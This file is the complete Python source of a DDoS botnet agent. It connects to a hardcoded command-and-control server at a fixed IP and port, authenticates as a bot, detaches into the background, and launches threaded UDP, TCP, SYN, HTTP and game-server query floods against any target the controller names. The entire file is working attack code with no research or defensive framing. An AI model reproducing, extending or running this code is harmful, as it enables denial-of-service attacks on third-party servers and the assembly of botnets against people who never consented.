import socket
import threading
import time
import os
import random
import sys

# Configuration
C2_ADDRESS = "134.255.234.140"
C2_PORT = 6666

# Payloads
payload_fivem = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
payload_vse = b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00'
payload_mcpe = b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c\x73'
payload_hex = b'\x55\x55\x55\x55\x00\x00\x00\x01'

PACKET_SIZES = [512, 1024, 2048]

base_user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",
    "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko"
]

def rand_ua():
    return random.choice(base_user_agents)

def daemonize():
    if os.fork() > 0:
        sys.exit()
    os.setsid()
    if os.fork() > 0:
        sys.exit()
    sys.stdout.flush()
    sys.stderr.flush()
    with open('/dev/null', 'rb', 0) as devnull:
        os.dup2(devnull.fileno(), sys.stdin.fileno())
        os.dup2(devnull.fileno(), sys.stdout.fileno())
        os.dup2(devnull.fileno(), sys.stderr.fileno())

def attack_fivem(ip, port, secs):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < secs:
        s.sendto(payload_fivem, (ip, port))

def attack_mcpe(ip, port, secs):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < secs:
        s.sendto(payload_mcpe, (ip, port))

def attack_vse(ip, port, secs):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < secs:
        s.sendto(payload_vse, (ip, port))

def attack_hex(ip, port, secs):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < secs:
        s.sendto(payload_hex, (ip, port))

def attack_udp_bypass(ip, port, secs):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < secs:
        packet_size = random.choice(PACKET_SIZES)
        packet = random._urandom(packet_size)
        sock.sendto(packet, (ip, port))

def attack_tcp_bypass(ip, port, secs):
    while time.time() < secs:
        packet_size = random.choice(PACKET_SIZES)
        packet = random._urandom(packet_size)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            while time.time() < secs:
                s.send(packet)
        except:
            pass
        finally:
            s.close()

def attack_tcp_udp_bypass(ip, port, secs):
    while time.time() < secs:
        try:
            packet_size = random.choice(PACKET_SIZES)
            packet = random._urandom(packet_size)

            if random.choice([True, False]):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                s.send(packet)
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(packet, (ip, port))
        except:
            pass
        finally:
            try:
                s.close()
            except:
                pass

def attack_syn(ip, port, secs):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setblocking(0)
    try:
        s.connect((ip, port))
        while time.time() < secs:
            packet_size = random.choice(PACKET_SIZES)
            packet = os.urandom(packet_size)
            s.send(packet)
    except:
        pass

def attack_http_get(ip, port, secs):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            while time.time() < secs:
                s.send(f'GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua()}\r\nConnection: keep-alive\r\n\r\n'.encode())
        except:
            s.close()

def attack_http_post(ip, port, secs):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            while time.time() < secs:
                payload = '757365726e616d653d61646d696e2670617373776f72643d70617373776f726431323326656d61696c3d61646d696e406578616d706c652e636f6d267375626d69743d6c6f67696e'
                headers = (f'POST / HTTP/1.1\r\n'
                           f'Host: {ip}\r\n'
                           f'User-Agent: {rand_ua()}\r\n'
                           f'Content-Type: application/x-www-form-urlencoded\r\n'
                           f'Content-Length: {len(payload)}\r\n'
                           f'Connection: keep-alive\r\n\r\n'
                           f'{payload}')
                s.send(headers.encode())
        except:
            s.close()

def attack_browser(ip, port, secs):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        try:
            s.connect((ip, port))
            request = (f'GET / HTTP/1.1\r\n'
                       f'Host: {ip}\r\n'
                       f'User-Agent: {rand_ua()}\r\n'
                       f'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n'
                       f'Accept-Encoding: gzip, deflate, br\r\n'
                       f'Accept-Language: en-US,en;q=0.5\r\n'
                       f'Connection: keep-alive\r\n'
                       f'Upgrade-Insecure-Requests: 1\r\n'
                       f'Cache-Control: max-age=0\r\n'
                       f'Pragma: no-cache\r\n\r\n')
            s.sendall(request.encode())
        except:
            pass
        finally:
            s.close()

def lunch_attack(method, ip, port, secs):
    methods = {
        '.HEX': attack_hex,
        '.UDP': attack_udp_bypass,
        '.TCP': attack_tcp_bypass,
        '.MIX': attack_tcp_udp_bypass,
        '.SYN': attack_syn,
        '.VSE': attack_vse,
        '.MCPE': attack_mcpe,
        '.FIVEM': attack_fivem,
        '.HTTPGET': attack_http_get,
        '.HTTPPOST': attack_http_post,
        '.BROWSER': attack_browser,
    }
    if method in methods:
        methods[method](ip, port, secs)

def main():
    c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

    while True:
        try:
            c2.connect((C2_ADDRESS, C2_PORT))

            while True:
                data = c2.recv(1024).decode()
                if 'Username' in data:
                    c2.send('BOT'.encode())
                    break

            while True:
                data = c2.recv(1024).decode()
                if 'Password' in data:
                    c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                    break

            print('connected!')
            break
        except:
            time.sleep(120)

    while True:
        try:
            data = c2.recv(1024).decode().strip()
            if not data:
                break

            args = data.split(' ')
            command = args[0].upper()

            if command == 'PING':
                c2.send('PONG'.encode())
            else:
                method = command
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=lunch_attack, args=(method, ip, port, secs), daemon=True).start()
        except:
            break

    c2.close()
    main()

if __name__ == '__main__':
    try:
        main()
    except:
        pass
